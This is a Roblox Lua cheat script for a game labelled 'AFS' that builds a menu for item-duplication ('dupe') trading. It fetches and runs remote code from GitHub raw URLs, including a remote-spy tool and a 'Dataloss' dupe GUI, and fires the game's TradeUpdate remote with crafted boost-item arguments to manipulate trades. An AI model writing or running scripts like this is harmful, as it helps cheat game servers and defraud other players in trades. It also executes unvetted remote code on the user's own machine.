local uilibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kiet1308/tvkhub/main/rac"))()
local windowz = uilibrary:CreateWindow("UI Library", "AFS", true)

local Page1 = windowz:CreatePage("Trade CC")


local Section1 = Page1:CreateSection("AFS DUPE TRADE")

Section1:CreateButton("By Tobidupebest", function ()
  loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Tobias020108Back/YBA-AUT/main/AFS-Dataloss-GUI.lua"))()
end)

Section1:CreateButton("simple spy", function ()
  loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
end)

local Page1 = windowz:CreatePage("Add items")

local Section1 = Page1:CreateSection("AFS DUPE TRADE")

Section1:CreateButton("add items/1", function ()
  local args = {
    [1] = {
        ["1"] = {
            [1] = "SuperDmgBoost",
            [2] = 100
        },
        ["3"] = {
            [1] = "SuperDropsBoost",
            [2] = 100
        },
        ["2"] = {
            [1] = "SuperLuckBoost",
            [2] = 100
        },
        ["5"] = {
            [1] = "SuperXpBoost",
            [2] = 100
        },
        ["4"] = {
            [1] = "SuperYenBoost",
            [2] = 100
        },
        ["6"] = {
            [1] = "ShinyBoost",
            [2] = 100
        }
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("TradeUpdate"):FireServer(unpack(args))

end)

